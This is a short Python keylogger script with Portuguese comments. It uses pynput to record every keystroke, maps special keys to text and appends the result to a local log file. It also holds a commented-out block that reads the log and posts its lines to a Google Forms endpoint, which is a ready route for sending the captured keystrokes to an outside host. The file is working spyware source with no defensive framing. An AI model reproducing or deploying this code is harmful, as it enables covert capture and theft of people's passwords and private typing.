from pynput.keyboard import Listener
import subprocess
import requests
import json
import os 

#definir a localização do arquivo de log
logFile = "/home/znt/scrips/log.txt"


def escreva(Letra):

	# Aqui como viu e um tradutor de letra,no caso as abaixo

	traduzir = {

		'Key.space': " ",
		'Key.shift': ' ',
		'Key.enter': '\n',
		'Key.tab': "	",
		'Key.alt': '',
		'Key.esc': '',
		'Key.cmd': '',
		'Key.caps_lock': '',
		'Key.backspace': '',
		'Key.ctrl': ' ',
		'Key.ctrl_l': 'ctrl+',
		'Key.ctrl_r': 'ctrl+',
	}

	# Aqui vamos converter as letras para strings
	escrita = str(Letra)

	# Aqui e para tira as aspas simples de algumas letras
	escrita = escrita.replace("'", "")

	# Aqui aplicar o tradutor
	for letra in traduzir:
		escrita = escrita.replace(letra, traduzir[letra])

	with open(logFile, "a") as n:
		n.write(escrita)
'''
		arquivo = open('/home/znt/Documentos/log.txt', 'r')
		for linha in arquivo:
			print(linha)
		arquivo.close()
		
		payload = {'entry.722472479': linha}

		r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdPA5fhRbhgxWwNyNUdY7HcuK02kHyuT2IPwBy4kEuyvHn05w/formResponse", data=payload)
'''
# E esse roda o keylogger
with Listener(on_press=escreva) as x:
	x.join()
